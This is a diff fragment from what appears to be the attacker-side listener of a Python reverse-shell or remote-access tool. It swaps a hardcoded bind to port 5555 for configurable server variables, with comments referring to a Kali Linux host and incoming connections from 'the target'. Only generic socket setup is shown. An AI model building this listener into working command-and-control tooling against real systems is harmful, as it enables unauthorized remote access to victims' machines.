@@ -306,12 +306,10 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Allow socket reuse to prevent "Address already in use" error
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# Bind the socket to listen on all interfaces and port 5555
-# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
-sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces
+sock.bind((SERVER_IP, SERVER_PORT)) 
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections on port 5555')
+print(f'[+] Listening For The Incoming Connections on port {SERVER_PORT}')
 sock.listen(5)
 
 # Accept incoming connection from the target and obtain the target's IP address.
